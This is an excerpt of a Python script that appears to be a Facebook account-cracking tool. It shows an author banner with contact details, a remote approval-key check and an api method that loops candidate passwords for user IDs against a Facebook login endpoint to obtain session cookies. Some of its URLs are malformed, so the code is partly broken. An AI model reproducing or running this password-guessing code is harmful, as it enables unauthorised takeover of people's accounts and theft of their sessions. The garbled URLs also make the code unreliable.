...
def helpnote():
	...
	subprocess.check_output(["am", "start", "/https://github.com/Khadarcabdalle124/RNDM4.gitapproval.txt/blob/main/Ap.txt"])
	exit(" [*] FACEBOOK :  MOHAMEDKHADARCABDALLE")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰MOHAMEDKHADARCABDALLE")
	subprocess.check_output(["am", "start", "https://www.facebook.com/Mohamed.khadar.208"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/https://github.com/Khadarcabdalle7/khadarcabdalle9.git/approval.txt/blob/main/Ap.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : MOHAMED KHADAR CABDALLE 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : KHADAR CABDALLE 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : KHADAR 
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : 0636951234
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		for pw in pwx:
			...
			response = ses.get("https://www.facebook.com/Mohamed.khadar.208/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
